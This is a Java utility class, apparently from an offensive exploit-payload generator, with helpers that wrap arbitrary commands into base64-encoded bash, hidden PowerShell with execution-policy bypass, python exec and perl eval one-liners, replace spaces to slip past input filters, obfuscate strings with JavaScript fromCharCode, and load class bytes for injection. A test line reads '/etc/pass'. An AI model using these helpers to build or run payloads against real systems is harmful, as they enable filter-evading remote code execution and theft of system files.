package com.bloom.util;

import com.unboundid.util.Base64;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Random;

public class Functions {

    public static String makeCommand(String command) {
        if (command.startsWith("base64=")) {
            command = "bash -c {echo," + Base64.encode(command.replace("base64=", "")) + "}|{base64,-d}|{bash,-i}";
        }
        if (command.startsWith("powershell=")) {
            command = "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc " + Base64.encode(command.replace("powershell=", ""));
        }
        if (command.startsWith("python=")) {
            command = "python -c exec('" + Base64.encode(command.replace("python=", "")) + "'.decode('base64'))";
        }
        if (command.startsWith("perl=")) {
            command = "perl -MMIME::Base64 -e eval(decode_base64('" + Base64.encode(command.replace("perl=", "")) + "'))";
        }
        return command;
    }

    public static String makeJavaScriptString(String str2) {
        ArrayList<String> result = new ArrayList<String>(str2.length());
        for (int i2 = 0; i2 < str2.length(); ++i2) {
            Integer x = Character.codePointAt(str2, i2);
            result.add(x.toString());
        }
        return "String.fromCharCode(" + String.join((CharSequence)",", result) + ")";
    }

    public static String getRandomString() {
        String str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder();
        sb.append("Exp");
        for (int i = 0; i < 10; i++) {
            char ch = str.charAt(new Random().nextInt(str.length()));
            sb.append(ch);
        }
        return sb.toString();
    }
    public static String SpacePass(String command){

        command=command.replace(" ","\\t\\n");
//        System.out.println(command);
        return command;
    }


    public static byte[] getClassBytes(Class clazz) throws Exception {
        String className = clazz.getName();
        String resoucePath = className.replaceAll("\\.", "/") + ".class";
        InputStream in = Functions.class.getProtectionDomain().getClassLoader().getResourceAsStream(resoucePath);
        byte[] bytes = new byte[1024];
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        int len = 0;
        while((len = in.read(bytes)) != -1){
            baous.write(bytes, 0 , len);
        }

        in.close();
        baous.close();

        return baous.toByteArray();
    }

    public static byte[] getClassBytes(String resoucePath) throws Exception {
//        String resoucePath = className.replaceAll("\\.", "/") + ".class";
        InputStream in = Functions.class.getProtectionDomain().getClassLoader().getResourceAsStream(resoucePath);
        byte[] bytes = new byte[1024];
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        int len = 0;
        while((len = in.read(bytes)) != -1){
            baous.write(bytes, 0 , len);
        }

        in.close();
        baous.close();

        return baous.toByteArray();
    }

    public static void main(String[] args) {
        String a=SpacePass("cat /etc/pass");
        System.out.println(a);
    }

    public static boolean ipCheck(String text) {
        if (text != null && !text.isEmpty()) {
            String regex = "^(1\\d{2}|2[0-4]\\d|25[0-5]|[1-9]\\d|[1-9])\\."
                    + "(1\\d{2}|2[0-4]\\d|25[0-5]|[1-9]\\d|\\d)\\." +"(1\\d{2}|2[0-4]\\d|25[0-5]|[1-9]\\d|\\d)\\."
                    + "(1\\d{2}|2[0-4]\\d|25[0-5]|[1-9]\\d|\\d)$";
            if (text.matches(regex)) {
                return true;
            } else {
                return false;
            }
        }
        return false;
    }


//    public static String cheakpayload(String s) {
//        if(s!=null){
//            return s;
//        }else {
//            System.out.println();
//        }
//
//    }
}
